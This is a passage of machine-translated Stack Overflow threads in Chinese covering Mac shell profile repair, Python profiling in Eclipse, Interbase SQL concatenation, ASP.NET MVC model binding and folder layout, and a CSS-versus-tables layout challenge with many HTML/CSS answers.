查看 --- [http://www.sweeting.org/mark/blog/2008/05/26/mac-os-x-tip-setting-path-environment-variables](http://www.sweeting.org/mark/blog/2008/05/26/mac-os-x-tip-setting-path-environment-variables)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2018-07-23T13:48:52.880

我遇到了同样的问题，这就是我解决它的方法。

首先，我以这种方式将文件恢复为原始文件

```
/usr/bin/nano ~/.bash_profile 
```

就我而言，我无法使用任何命令别名。如果不指定该命令的完整路径，即使 vi 或 vim 也无法工作。如果 nano 没有安装，只需用安装的编辑器替换命令中的 nano

之后，只需重新启动计算机。正如我在下面所说的那样，就我而言，我无法使用任何命令。尝试执行**/usr/bin/source ~/.bash_profile** 时，该命令失败。所以我不得不重新启动操作系统并且它工作

# python - Eclipse 中的 Python 分析

> ID：636695
> 
> 赞同：12
> 
> 时间：2009-03-11T22:55:47.500
> 
> 标签：python, eclipse, profiling

这个问题是半基于这个的：

[如何分析 python 脚本？](https://stackoverflow.com/questions/582336/how-can-you-profile-a-python-script)

我认为在我的一些程序上运行这将是一个好主意。尽管可以按照上述答案中的说明从批处理文件进行分析，但我认为在 Eclipse 中使用此选项会更好。同时，使我的整个程序成为一个函数并对其进行分析意味着我必须更改源代码？

**如何配置 eclipse 以便能够在现有程序上运行 profile 命令？**

欢迎任何提示或建议！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-03-12T06:22:20.907

如果您遵循常见的 python 习惯，使您的所有代码，甚至是“现有程序”，都可以作为模块导入，那么您可以完全按照您的描述进行操作，而无需任何额外的麻烦。

这是我正在谈论的特定习语，这会使您的程序流程“颠倒”，因为一旦完成所有 s `__name__ == '__main__'`，它将被放置在文件的底部：`def`

```
# program.py file

def foo():
    """ analogous to a main().  do something here """
    pass

# ... fill in rest of function def's here ...

# here is where the code execution and control flow will
# actually originate for your code, when program.py is
# invoked as a program.  a very common Pythonism...
if __name__ == '__main__':
    foo() 
```

以我的经验，***改造任何现有的脚本非常容易，你必须***遵循这种形式，最多可能几分钟。

由于让您同时编写一个模块还有其他好处，您会发现大多数`python`脚本实际上都是这样做的。这样做的一个好处是：`python`您编写的任何内容都可能以模块形式使用，包括`cProfile`您的`foo()`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-03-11T23:31:22.143

您始终可以创建单独的模块，仅对其他模块中的特定内容进行分析。您可以在单独的包中组织这些模块。这样您就不会更改现有代码。

# sql - 如何通过 SQL 语句合并数据库表中的数据？

> ID：636701
> 
> 赞同：0
> 
> 时间：2009-03-11T22:59:12.873
> 
> 标签：sql, merge, insert, interbase

我对 Interbase 有一个有趣的问题。我有一个记录集，其中有一个数据输入字段和每条记录的时间戳。我希望能够从记录中复制时间戳，以便在一天结束时，最终字段将按照以下方式读取：

```
TIMESTAMP <Carriage return> <carriage return> Original data in field 
```

因此，显示该字段时的最终外观是：

```
time of entry

data that was entered 
```

遗憾的是，这必须在数据库级别完成，因为我无法访问前端软件。

我能想出的唯一解决方案是选择，使用自定义软件执行合并，然后逐行生成适当的 SQL 来更新记录。由于每天有数百条记录，这相当慢，因此基于 SQL 的解决方案将是理想的。

过去，我已经成功地将固定数据添加到字符串的末尾，`||`用于与`UPDATE`指令连接（数据||所有记录都相同的额外信息”），但无法以以下格式进行这项工作：

```
result of search||original data 
```

任何帮助将非常感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-03-12T00:59:58.683

```
UPDATE FOO_TABLE
  SET DATA_ENTRY_FIELD = DATA_ENTRY_FIELD || TIMESTAMP_FIELD
WHERE ...; 
```

这应该可以工作（前提是 DATA_ENTRY_FIELD 有连接空间）。如果它不起作用，请更具体地说明您遇到的问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-03-15T18:21:31.667

克雷格的回答应该有效，但如果你想要回车，你也需要插入它们：

```
UPDATE  foo_table
SET     data_entry_field = timestamp || '\n\n' || data_entry_field
WHERE   ... 
```

（假设 Interbase 接受`\n`回车 - 这实际上应该只是`\r`甚`\r\n`至在 Windows 上，但`\n`相当标准。）

MySQL 无法识别`||`连接运算符，因此您必须改用该`CONCAT()`函数。Interbase可能是一样的。

# asp.net-mvc - UpdateModel 与 TryUpdateModel

> ID：636703
> 
> 赞同：15
> 
> 时间：2009-03-11T22:59:59.457
> 
> 标签：asp.net-mvc

我有一些关于 asp.net mvc 开发的简单问题。

UpdateModel 和 TryUpdateModel 有什么用？以及哪个条件适用于使用 UpdateModel 或 TryUpdateModel。根据我的经验，除了将 FormCollection 绑定到 Model 之外，TryUpdateModel 还可以验证数据。这是对的吗 ？

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2009-03-11T23:20:15.117

没错，这两种方法都用于使用 Form 值更新模型并执行验证。有一个默认的活页夹，但如果需要，您可以构建自定义活页夹。

这两种方法的区别在于，如果验证失败，UpdateModel 将抛出异常，而 TryUpdateModel 将以布尔值通知验证结果。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2018-01-30T11:04:26.957

主要区别 Updatemodel() 如果验证失败会抛出异常 但是在 TryUpdatemodel() 中验证失败时永远不会抛出异常

相似性两者都用于使用表单值更新模型并执行验证

# asp.net - ASP MVC 文件夹层次结构

> ID：636711
> 
> 赞同：3
> 
> 时间：2009-03-11T23:03:12.663
> 
> 标签：asp.net, asp.net-mvc, directory

我有一个相当大的 ASP MVC 应用程序。我宁愿创建一些层次结构，而不是在控制器目录中拥有许多控制器。所以我可能有类似的东西

```
~\Controllers\Security\
~\Controllers\Maintenance\
~\Controllers\Reports\ 
```

我也希望能够对 Views 做类似的事情

```
~\Views\Security\Users\
~\Views\Security\Roles\
~\Views\Maintenance\Customer\
~\Views\Maintenance\Product\ 
```

这很容易做到吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-03-11T23:32:44.557

我认为您正在寻找类似“大师”在这篇文章中所说的内容：

[http://haacked.com/archive/0001/01/01/areas-in-aspnetmvc.aspx](http://haacked.com/archive/0001/01/01/areas-in-aspnetmvc.aspx)

基本上你必须创建一个 ViewEngine 来指定在哪里寻找视图。这是一个相当简单的代码，只是不要忘记在 global.asax 中注册它！至于控制器部分，您还必须在 global.asax 中注册新路由。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-03-11T23:37:04.610

您正在搜索的概念称为“区域”，如 Phil Haack 所述：http: [//haacked.com/archive/2008/11/04/areas-in-aspnetmvc.aspx](http://haacked.com/archive/2008/11/04/areas-in-aspnetmvc.aspx)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-03-11T23:31:59.550

我认为您需要编写自己的 RouteHandler，这应该不会太难。

一个快速的谷歌搜索出现了：[这篇博客文章详细介绍了它](http://weblogs.asp.net/fredriknormen/archive/2007/11/18/asp-net-mvc-framework-create-your-own-iroutehandler.aspx)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2015-07-27T09:33:55.293

您是否考虑过切换到功能文件夹。我已经尝试过了（稍加修改），效果很好。

在这篇文章中描述 [http://timgthomas.com/2013/10/feature-folders-in-asp-net-mvc/](http://timgthomas.com/2013/10/feature-folders-in-asp-net-mvc/)

代码示例在 Jimmiy Bogard 的仓库 [https://github.com/jbogard/presentations/tree/master/putyourcontrollersonadietv2](https://github.com/jbogard/presentations/tree/master/putyourcontrollersonadietv2)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-09-21T20:33:21.200

您真正想要的是让您的 Views 文件夹层次结构与控制器的命名空间层次结构相匹配。您可以编写一个自定义 ViewEngine 来相当容易地做到这一点 - 有关详细信息，请参阅我[在 GitHub 上的 ControllerPathViewEngine 项目](https://github.com/danmalcolm/ControllerPathViewEngine)。

我已经包含了 ControllerPathRazorViewEngine 类的片段来概述它是如何工作的。通过拦截 FindView / FindPartialView 方法并将控制器名称替换为文件夹路径（基于控制器命名空间和名称），我们可以让它从主 Views 文件夹中的嵌套文件夹加载视图。

```
 public class ControllerPathRazorViewEngine : RazorViewEngine
    {
        //... constructors etc.

        public override ViewEngineResult FindView(ControllerContext controllerContext, string viewName, string masterName, bool useCache)
        {
            return FindUsingControllerPath(controllerContext, () => base.FindView(controllerContext, viewName, masterName, useCache));
        }

        public override ViewEngineResult FindPartialView(ControllerContext controllerContext, string partialViewName, bool useCache)
        {
            return FindUsingControllerPath(controllerContext, () => base.FindPartialView(controllerContext, partialViewName, useCache));
        }

        private ViewEngineResult FindUsingControllerPath(ControllerContext controllerContext, Func<ViewEngineResult> func)
        {
            string controllerName = controllerContext.RouteData.GetRequiredString("controller");
            string controllerPath = controllerPathResolver.GetPath(controllerContext.Controller.GetType());
            controllerContext.RouteData.Values["controller"] = controllerPath;
            var result = func();
            controllerContext.RouteData.Values["controller"] = controllerName;
            return result;
        }
    } 
```

# css - 你会怎么做：表格还是 CSS？

> ID：636712
> 
> 赞同：71
> 
> 时间：2009-03-11T23:03:13.630
> 
> 标签：css, layout, xhtml, html-table

[![谜](https://i.stack.imgur.com/6qUOk.gif)](https://i.stack.imgur.com/6qUOk.gif) [![格林奇](https://i.stack.imgur.com/2QbWi.gif)](https://i.stack.imgur.com/2QbWi.gif)
[（来源：[sontag.ca](http://sontag.ca/gif/grinch.gif)）]

## 第一部分

这种布局可以很简单地用 2 个 HTML 表格来完成，一个嵌套在另一个里面，甚至可以用一个表格来完成。

它也可以用 CSS 来完成，尽管它可能*需要更多的思考*。

这可能不是真实世界的布局，但我见过类似的页面。认为这是一个谜；一个锻炼你的 CSS 技能的练习。

[为了让事情变得更有趣，我在一个名为The Challenge](https://web.archive.org/web/20121128141851/http://sontag.ca:80/TheChallenge/)的小 2 部分网页中提出了这个问题。我们将检查代码和问题：**使用表格布局还是 CSS？**，并排，一击一击，因为我们的两个对手争夺代码霸权。

第一部分阐述了**[挑战](https://web.archive.org/web/20121128141851/http://sontag.ca:80/TheChallenge/)**是如何产生的。我希望你喜欢。

第二部分是[决定](https://web.archive.org/web/20090330024144/http://sontag.ca:80/TheChallenge/CSS%20versus%20Tables.html)。 *你可能会感到惊讶*。

* * *

## 第二部分

我很惊讶在我发布后*几分钟真正好的答案出现的速度如此之快。*这是一次令人谦卑的经历。我不想和你竞争计时赛。

但是，话虽如此，在仔细检查所提供的解决方案后，我开始意识到没有一个 CSS 解决方案（包括我当时自己的）能像所提供的任何一个表格解决方案一样有效。挑战在于 CSS 比**任何**布局解决方案的表格都要好。

所以我添加了 3 条新规则（请记住，其中一条规则是可以更改规则）。这惹恼了一些人。因此，我添加了一些关于为什么更改规则的丰富多彩的解释。我认为这更让他们恼火。

1.  我们的花园要围着栅栏；有什么东西可以把它与它可能发现的任何沉闷的环境区分开来；而且不是太贵，但易于保持清洁。所以我想要花园周围有一个 1 像素的黑色边框
2.  每个花园地块的居民（角色）必须是黑人或白人，这取决于哪个人在他们的花园里表现得最好。而且都是草书血统。它们之间没有斜体。;-)
3.  花园是可重定位的，也就是说，我可以在页面的任何位置拥有这个花园（没有绝对定位）。

这是最终输出的样子（背景颜色可选）：

[![替代文字](https://i.stack.imgur.com/syktC.gif)](https://i.stack.imgur.com/syktC.gif)
[（来源：[sontag.ca](http://sontag.ca/gif/garden.gif)）]

对于反复无常和最后一刻的规则更改，我深表歉意。我错了。每个花园地块的居民都是工匠，手工制作的专家。他们是*草书家族*的后代，他们的风格感归功于*斜体*。

花园必须是可重定位的，因为两种花园（表格和 CSS）需要在同一页面上**共存。**我说`position:absolute`不允许有规则可能是错误的。如果你能让他们在这种情况下工作，那么你就有更多的权力。他们肯定会被接受。

我要求在地块周围设置一个栅栏，因为每种花园类型都将种植在一个橙色背景的乡村，与我们种植的一些花朵的颜色非常相似。

我现在住在荷兰，郁金香季节快到了。如果您在接下来的几周内飞越荷兰，并且天气晴朗（这里很少见），您下方的风景将看起来与这个愚蠢的练习非常相似。

我不喜欢橙色，但我喜欢并欣赏荷兰人，所以这就是为什么我们有橙色背景，向我的东道国致敬。:-)

* * *

## 第三部分

我在下面的挑战中发布了 Ted 的[表格答案](https://stackoverflow.com/questions/636712/how-would-you-do-this-tables-or-css/645292#645292)以及这张图片

[![替代文字](https://i.stack.imgur.com/BNynK.gif)](https://i.stack.imgur.com/BNynK.gif)
[（来源：[sontag.ca](http://sontag.ca/gif/garden2.gif)）]

因为居住者可以很容易地添加到花园地块而无需触及 CSS 规则 - 一切都自动居中。

*你能用* **CSS 做到这一点吗？** *你能用……鲱鱼砍倒森林里最强壮的树吗？*

* * *

**更新**：查理的答案在这里。

* * *

## 回答 #1

> 赞同：37
> 
> 时间：2009-03-11T23:36:06.170

**更新：** *最终编辑。*切换到 STRICT DTD，删除斜体以匹配问题中的图像，并恢复为 id 的全彩色名称以根据 OP 对问题的评论显示意图，并将 css 中 id 名称的主列按它们出现的顺序排序在 html 中。

[我还选择不将外部 div 重用为白色 7 正方形（在以前的编辑](https://stackoverflow.com/revisions/viewmarkup/850725)中它没有自己的 div ），因为如果您想使用布局，它就不实用了，而且感觉有点像作弊（尽管从简洁/像素完美的角度来看，我喜欢它的厚颜无耻）。

在此处查看：http: [//jsbin.com/efidi](http://jsbin.com/efidi)
在此处 编辑：http: [//jsbin.com/efidi/edit](http://jsbin.com/efidi/edit)
[验证为严格的 XHTML](http://validator.w3.org/check?verbose=1&uri=http%3A%2F%2Fjsbin.com%2Fefidi)

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head><title>The Challenge</title>
<style type="text/css">
div     { text-align: center; width:175px; height:175px; line-height: 35px;}
div div {         float:left; width: 35px; height: 35px;}
#orange, #maroon,
#blue  , #green  {float:right;}

#orange, #silver {background-color:silver;  width:140px;}
#navy  , #maroon {background-color:maroon; height:140px; line-height:140px;}
         #navy   {background-color:navy  ;}
#green , #red    {background-color:red   ;  width: 70px;}
#yellow, #blue   {background-color:blue  ; height: 70px; line-height: 70px;}
         #yellow {background-color:yellow;}
         #white  {background-color:white ;}
         #green  {background-color:green ;}
         #orange {background-color:orange;}
</style> 
</head> 
<body> 
  <div> 
    <div id="silver">1</div> 
    <div id="maroon">2</div> 
    <div id="navy"  >3</div> 
    <div id="red"   >4</div> 
    <div id="blue"  >5</div> 
    <div id="yellow">6</div> 
    <div id="white" >7</div>
    <div id="green" >8</div> 
    <div id="orange">9</div> 
  </div>
</body></html> 
```

旁白：如果可以的话，我可能会添加更多的空白，但这是在 SO 上的代码块开始获得滚动条之前的限制，我选择让它全部出现在屏幕上。

[注意：我从Tyson](https://stackoverflow.com/questions/636712/how-would-you-do-this-with-css/636780#636780)那里借来了`line-height`修复（他是第一个得到正确渲染答案的人）。

* * *

## 回答 #2

> 赞同：18
> 
> 时间：2009-03-11T23:28:30.807

这里有三个解决方案。

标记：

```
<div id="outer">
    <div id="a1">1</div>
    <div id="a2">2</div>
    <div id="a3">3</div>
    <div id="a4">4</div>
    <div id="a5">5</div>
    <div id="a6">6</div>
    <div id="a7">7</div>
    <div id="a8">8</div>
    <div id="a9">9</div>
</div> 
```

基本样式表（尺寸和颜色）：

```
#outer {
    width: 20em;
    height: 20em;
}
#a1 {
    background-color: #C0C0C0;
    width: 80%;
    height: 20%;
}
#a2 {
    background-color: #800000;
    width: 20%;
    height: 80%;
}
#a3 {
    background-color: #000080;
    width: 20%;
    height: 80%;
}
#a4 {
    background-color: #FF0000;
    width: 40%;
    height: 20%;
}
#a5 {
    background-color: #0000FF;
    width: 20%;
    height: 40%;
}
#a6 {
    background-color: #FFFF00;
    width: 20%;
    height: 40%;
}
#a7 {
    background-color: #FFFFFF;
    width: 20%;
    height: 20%;
}
#a8 {
    background-color: #008000;
    width: 40%;
    height: 20%;
}
#a9 {
    background-color: #FFA500;
    height: 20%;
    width: 80%;
} 
```

而现在的定位：

*   使用`float`：

    ```
    #a1 {
        float: left;
    }
    #a2 {
        float: right;
    }
    #a3 {
        float: left;
    }
    #a4 {
        float: left;
    }
    #a5 {
        float: right;
    }
    #a6 {
        float: left;
    }
    #a7 {
        float: left;
    }
    #a8 {
        float: right;
    }
    #a9 {
        float: right;
    } 
    ```

*   使用`position`：

    ```
    #outer {
        position: relative;
    }
    #outer div {
        position: absolute;
    }
    #a1 {
        top: 0;
        left: 0;
    }
    #a2 {
        top: 0;
        right: 0;
    }
    #a3 {
        top: 20%;
        left: 0;
    }
    #a4 {
        top: 20%;
        left: 20%;
    }
    #a5 {
        top: 20%;
        right: 20%;
    }
    #a6 {
        top: 40%;
        left: 20%;
    }
    #a7 {
        top: 40%;
        left: 40%;
    }
    #a8 {
        bottom: 20%;
        right: 20%;
    }
    #a9 {
        bottom: 0;
        right: 0;
    } 
    ```

*   使用`margin`：

    ```
    #a1 {
    }
    #a2 {
        margin: -20% -80% 0 80%;
    }
    #a3 {
        margin: -60% 0 0 0;
    }
    #a4 {
        margin: -80% -20% 0 20%;
    }
    #a5 {
        margin: -20% -60% 0 60%;
    }
    #a6 {
        margin: -20% -20% 0 20%;
    }
    #a7 {
        margin: -40% -40% 0 40%;
    }
    #a8 {
        margin: 0 -40% 0 40%;
    }
    #a9 {
        margin: 0 -20% 0 20%;
    } 
    ```

* * *

## 回答 #3

> 赞同：17
> 
> 时间：2009-03-12T00:46:19.497

给你 - 比任何滥用表格标签可以提供的行更少：

```
<img
    src="http://sontag.ca/TheChallenge/tiles.gif"
    alt="nine assorted coloured rectangles"
/> 
```

:P

* * *

## 回答 #4

> 赞同：13
> 
> 时间：2009-03-11T23:35:24.193

这与您的表格示例完全匹配，包括垂直和水平居中的文本（到目前为止没有其他人做过）。

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>

    <title>Boxy Boxes in a Box</title>

    <style type="text/css" media="screen">
        #container {position: relative; margin: 100px auto; height: 175px; width: 175px; font-style: italic; }

        .box {width: 35px; height: 35px; position: absolute; text-align: center; line-height: 35px;}

        #box_1 {top: 0; left: 0; width: 140px; background-color: silver;}
        #box_2 {top: 0; right: 0; height: 140px; background-color: maroon; line-height: 140px;}
        #box_3 {top: 35px; left: 0; height: 140px; background-color: navy; line-height: 140px;}
        #box_4 {top: 35px; left: 35px; width: 70px; background-color: red;}
        #box_5 {top: 35px; right: 35px; height: 70px; background-color: blue; line-height: 70px;}
        #box_6 {top: 70px; left: 35px; height: 70px; background-color: yellow; line-height: 70px;}
        #box_7 {top: 70px; left: 70px; background-color: white;}
        #box_8 {bottom: 35px; right: 35px; width: 70px; background-color: green;}
        #box_9 {bottom: 0; right: 0; width: 140px; background-color: orange;}
    </style>
</head>

<body>
    <div id="container">
        <div id="box_1" class="box">1</div>
        <div id="box_2" class="box">2</div>
        <div id="box_3" class="box">3</div>
        <div id="box_4" class="box">4</div>
        <div id="box_5" class="box">5</div>
        <div id="box_6" class="box">6</div>
        <div id="box_7" class="box">7</div>
        <div id="box_8" class="box">8</div>
        <div id="box_9" class="box">9</div>
    </div>
</body>
</html> 
```

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2009-03-11T23:35:43.927

只要宽度和高度不变，总是可以使用绝对定位来获得相同的效果。这应该很明显，所以我不必输入它（这里很晚，我很懒：P）

* * *

## 回答 #6

> 赞同：4
> 
> 时间：2009-03-12T01:17:00.843

我采取的方法与我目前看到的“id all”解决方案略有不同。这比基于表格的解决方案多出不到 100 个字符。

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
 "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title>The Challenge</title>
<style type="text/css">
div {
    position:absolute;
    width:35px;
    height:35px;
    text-align:center;
    line-height:35px
}

.spiral { width:175px; height:175px }

.t { top:0 }
.l { left:0 }
.r { right:0 }
.b { bottom:0 }
.w { width:140px }
.h { height:140px; line-height:140px }
.c {
    top:35px;
    left:35px;
    width:105px;
    height:105px
}

.c .w { width:70px }
.c .h { height:70px; line-height: 70px }
.c .c { width:35px; height: 35px }
</style>
</head>
<body>
<div class="spiral">
    <div class="t l w" style="background-color:silver">1</div>
    <div class="t r h" style="background-color:maroon">2</div>
    <div class="b l h" style="background-color:navy">3</div>
    <div class="c">
        <div class="t l w" style="background-color:red">4</div>
        <div class="t r h" style="background-color:blue">5</div>
        <div class="b l h" style="background-color:yellow">6</div>
        <div class="c">7</div>
        <div class="b r w" style="background-color:green">8</div>
    </div>
    <div class="b r w" style="background-color:orange">9</div>
</div>
</body>
</html> 
```

**编辑：**根据您的修改，我发布了一个稍微详细但希望更清晰的解决方案，添加黑色边框，将一些文本设置为白色，并且不绝对定位“花园”。

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
 "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title>The Challenge</title>
<style type="text/css">
div {
    position:absolute;
    width:35px;
    height:35px;
    text-align:center;
    line-height:35px
}

div.spiral {
    position:relative;
    width:175px;
    height:175px;
    border: 1px solid #000
}

.top { top:0 }
.left { left:0 }
.right { right:0 }
.bottom { bottom:0 }
.wide { width:140px }
.tall { height:140px; line-height:140px }
.center {
    top:35px;
    left:35px;
    width:105px;
    height:105px
}

.center .wide { width:70px }
.center .tall { height:70px; line-height: 70px }
.center .center { width:35px; height: 35px }
</style>
</head>
<body>
<div class="spiral">
    <div class="top left wide" style="background-color:silver">1</div>
    <div class="top right tall" style="background-color:maroon">2</div>
    <div class="bottom left tall" style="background-color:navy;color:#fff">3</div>
    <div class="center">
        <div class="top left wide" style="background-color:red">4</div>
        <div class="top right tall" style="background-color:blue">5</div>
        <div class="bottom left tall" style="background-color:yellow">6</div>
        <div class="center">7</div>
        <div class="bottom right wide" style="background-color:green">8</div>
    </div>
    <div class="bottom right wide" style="background-color:orange">9</div>
</div>
</body>
</html> 
```

* * *

## 回答 #7

> 赞同：4
> 
> 时间：2009-03-13T09:36:06.037

单表解决方案。

**现在不要对我投反对票。**

我知道这不是原始问题的答案。
我发布了这个答案，因为*OP*在对原始问题的评论中要求它。

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <meta http-equiv="Content-language" content="en" />
        <title>The Challenge</title>
    </head>
    <body>

        <table cellspacing="0" cellpadding="0" border="0" summary="">
            <tr>
                <td colspan="4" height="35" align="center" bgcolor="silver"><i>1</i></td>
                <td rowspan="4" width="35" align="center" bgcolor="maroon"><i>2</i></td>
                <td rowspan="5" valign="bottom"><img src="http://sontag.ca/gif/grinch.gif" width="41" height="122" alt="Dr. Suess's Grinch"/></td>
            </tr><tr>
                <td rowspan="4" width="35" align="center" bgcolor="navy"><i>3</i></td>
                <td colspan="2" height="35" align="center" bgcolor="red"><i>4</i></td>
                <td rowspan="2" width="35" align="center" bgcolor="blue"><i>5</i></td>
            </tr><tr>
                <td rowspan="2" width="35" align="center" bgcolor="yellow"><i>6</i></td>
                <td width="35" height="35" align="center"><i>7</i></td>
            </tr><tr>
                <td colspan="2" height="35" align="center" bgcolor="green"><i>8</i></td>
            </tr><tr>
                <td colspan="4" height="35" align="center" bgcolor="orange"><i>9</i></td>
            </tr>
        </table>

    </body>
</html> 
```

它是有效的 XHTML 1.0 过渡，我已经包含了 Dr. Suess 角色 :)

通过剥离`Dr. Suess character`、`<?xml`声明、`meta-tags`和`summary`属性，您可以将其减少到 929 个字符，并且仍然是有效的 XHTML 1.0 过渡。

**编辑**

根据要求，XHTML 1.0 Strict

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
    <head>
        <title>The Challenge</title>
        <style type="text/css">
            BODY {background: orange}
            #garden {border: 1px solid black; color: black}
            #garden TD {
                font: italic 100% 'Comic Sans MS', cursive;
                height: 35px;
                padding: 0;
                text-align: center;
                width: 35px
            }
            #c1 {background: silver}
            #c2 {background: maroon; color: white}
            #c3 {background: navy;   color: white}
            #c4 {background: red}
            #c5 {background: blue;   color: white}
            #c6 {background: yellow}
            #c7 {background: white}
            #c8 {background: green;  color: white}
            #c9 {background: orange}
        </style>
    </head>
    <body>

        <table id="garden" cellspacing="0">
            <tr>
                <td id="c1" colspan="4">1</td>
                <td id="c2" rowspan="4">2</td>
            </tr><tr>
                <td id="c3" rowspan="4">3</td>
                <td id="c4" colspan="2">4</td>
                <td id="c5" rowspan="2">5</td>
            </tr><tr>
                <td id="c6" rowspan="2">6</td>
                <td id="c7">7</td>
            </tr><tr>
                <td id="c8" colspan="2">8</td>
            </tr><tr>
                <td id="c9" colspan="4">9</td>
            </tr>
        </table>

    </body>
</html> 
```

970 个非空白字符，橙色背景，删除了 Suess 博士的怪癖。

* * *

## 回答 #8

> 赞同：4
> 
> 时间：2009-03-13T09:41:34.590

这里还没有人给出表格解决方案，挑战就是在受控（且严重偏颇）的场景中将 CSS 布局与基于表格的布局进行比较。

所以这里是 Ted 的表格布局解决方案和他的挑战......

*“使用我的基于表格的解决方案，只需向 HTML 标记添加非常简单的内容，就可以很容易地将新居民添加到花园地块中！所有居民都会自动以令人愉悦的方式居中和间隔。例如：”*

[![替代文字](https://i.stack.imgur.com/wcEoM.gif)](https://i.stack.imgur.com/wcEoM.gif)
[（来源：[sontag.ca](http://sontag.ca/gif/bluefish.gif)）][（来源：][[sontag.ca](http://sontag.ca/gif/garden2.gif)][）]
[![替代文字](https://i.stack.imgur.com/tUNxv.gif)](https://i.stack.imgur.com/tUNxv.gif)

*“据我所知，如果不对 CSS 规则进行大量更新，这里没有任何基于 CSS 的解决方案可以容纳新居民。”*

*“小伙子最好多带点钱，我现在好饿好渴。”*

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
   "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<title>Terrible Ted's Table Layout</title>
<style type="text/css">

#master TD { text-align: center }
#master { 
  border: 1px solid black;
  font: italic 100%/200% 'Comic Sans MS', cursive; 
}
#silver { background-color:silver }
#maroon { background-color: maroon;  color:white }
#navy { background-color:navy;  color:white }
#red { background-color: red }
#blue { background-color:blue;  color:white }
#yellow { background-color: yellow }
#green { background-color:green;  color:white }
#orange { background-color:orange }
#white { background-color:white }

#silver, #red, #green, #orange, #white { height: 35px }
#maroon, #navy, #blue, #yellow, #white { width: 35px }

</style>
</head>
<body style="background-color:#ffb600">

<table id="master" border="0" cellpadding="0" cellspacing="0" 
  summary="layoutByTable"><tr>
    <td id="silver" colspan="2" > 1 </td> 
    <td id="maroon" rowspan="2" > 2 </td>
  </tr><tr>
  <td id="navy" rowspan="2" > 3 </td>
  <td>
    <table border="0" cellpadding="0" cellspacing="0" 
      summary="inner"><tr>
        <td id="red" colspan="2" > 4 </td>
        <td id="blue" rowspan="2" > 5 </td>
      </tr><tr>
        <td id="yellow" rowspan="2" > 6 </td>
        <td id="white"> 7 </td>
      </tr><tr>
        <td id="green" colspan="2" > 8 </td>
      </tr>
    </table>
  </td>
</tr><tr>
 <td id="orange" colspan="2"> 9 </td>
</tr>
</table>

</body>
</html> 
```

* * *

## 回答 #9

> 赞同：2
> 
> 时间：2009-03-13T00:55:58.487

标记的简洁性....

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title>The Challenge</title>
<style type="text/css">
    .garden {
        position: relative;
        width: 175px;
        height: 175px;
        font-family: 'Comic Sans MS', cursive;
        border: 1px solid;
        color: #000;
        }
    .garden div {
        position: absolute;
        width: 35px;
        height: 35px;
        line-height: 35px;
        text-align: center;
        }
    .garden div:first-child {
        width: 140px;
        background: silver;
        }
    .garden div:first-child + div {
        right: 0;
        height: 140px;
        line-height: 140px;
        color: #fff;
        background: maroon;
        }
    .garden div:first-child + div + div {
        top: 35px;
        height: 140px;
        line-height: 140px;
        color: #fff;
        background: navy;
        }
    .garden div:first-child + div + div + div {
        top: 35px;
        left: 35px;
        width: 70px;
        background: red;
        }
    .garden div:first-child + div + div + div + div {
        top: 35px;
        right: 35px;
        height: 70px;
        line-height: 70px;
        background: blue;
        }
    .garden div:first-child + div + div + div + div + div {
        top: 70px;
        left: 35px;
        height: 70px;
        line-height: 70px;
        background: yellow;
        }
    .garden div:first-child + div + div + div + div + div + div {
        top: 70px;
        left: 70px;
        background: white;
        }
    .garden div:first-child + div + div + div + div + div + div + div {
        top: 105px;
        left: 70px;
        width: 70px;
        background: green;
        }
    .garden div:first-child + div + div + div + div + div + div + div + div{
        bottom: 0;
        right: 0;
        width: 140px;
        background: orange;
        }

    </style> 
</head> 
<body> 
<div class="garden"> 
<div>1</div> 
<div>2</div> 
<div>3</div> 
<div>4</div> 
<div>5</div> 
<div>6</div> 
<div>7</div>
<div>8</div> 
<div>9</div> 
</div>
</body>
</html> 
```

[关联](http://aloestudios.com/misc/garden.html)

* * *

## 回答 #10

> 赞同：1
